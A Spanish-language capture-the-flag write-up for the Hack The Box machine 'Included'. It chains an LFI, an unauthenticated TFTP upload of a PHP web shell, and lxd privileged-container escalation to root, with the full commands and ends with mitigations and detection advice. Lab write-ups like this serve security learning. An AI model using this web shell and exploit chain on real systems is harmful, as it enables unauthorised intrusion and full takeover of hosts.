---
machine: Included
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [lfi, tftp, lxd, linux, tier2]
---

# Included — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

LFI en `?file=` sobre **80/tcp**. Leyendo `/proc/net/udp` se descubre **TFTP (69/udp)**, que no autentica: se sube un `shell.php` a `/var/lib/tftpboot` y se incluye por el LFI. El usuario está en el grupo **lxd**, así que un contenedor privilegiado monta el disco y da root.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
sudo nmap -sU -p 69 --script tftp-enum <TARGET_IP>
```

```text
80/tcp  http  Apache httpd 2.4.41
69/udp  tftp
```

## Enumeración

```bash
curl -s "http://<TARGET_IP>/?file=/etc/passwd"
```

El parámetro incluye ficheros arbitrarios. Para encontrar servicios internos:

```bash
curl -s "http://<TARGET_IP>/?file=/proc/net/udp"
```

La tabla muestra un socket en el puerto **69** (TFTP), que no aparecía en el escaneo TCP.

## Foothold

TFTP no pide credenciales y escribe en `/var/lib/tftpboot`:

```bash
cat > shell.php <<'PHP'
<?php system($_GET['c']); ?>
PHP

tftp <TARGET_IP>
tftp> put shell.php
tftp> quit
```

Se incluye el fichero subido:

```bash
curl -s "http://<TARGET_IP>/?file=/var/lib/tftpboot/shell.php&c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data),lxd
```

## Movimiento lateral

- El grupo `lxd` es la vía: permite crear contenedores con privilegios.
- Se comprueba con `id` y `lxc list` (vacío, pero el socket está accesible).

## Escalada de privilegios

```bash
# imagen Alpine mínima
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

```text
# id
uid=0(root)
# cat /mnt/root/root/root.txt
```

Flags: `/home/mike/user.txt` y `/root/root.txt`.

## Evidencia

- `/proc/net/udp` con el socket 69.
- `id` con el grupo `lxd` y lectura de la flag desde el contenedor.

## Lecciones aprendidas

- Un LFI no solo lee `/etc/passwd`: `/proc` revela servicios y sockets internos.
- TFTP es UDP, sin autenticación y con directorio de escritura: subida directa.
- Pertenecer a `lxd` equivale a root: el contenedor privilegiado monta el host.
- Combinar LFI + subida + inclusión convierte una lectura de ficheros en RCE.

## Mitigaciones y detección

- Lista blanca de ficheros en el parámetro `file`; nada de rutas del usuario.
- TFTP deshabilitado o restringido a la red de gestión.
- Retirar usuarios del grupo `lxd`; usar `lxc` solo desde cuentas administrativas.
- Detección: peticiones con `../` o `/proc/`, transferencias TFTP `WRQ`, creación de contenedores.

- CWE-98, CWE-434, CWE-269
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1611 Escape to Host](https://attack.mitre.org/techniques/T1611/)

## Referencias

- [HackTricks — LXD/LXC privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [HackTricks — TFTP](https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp)
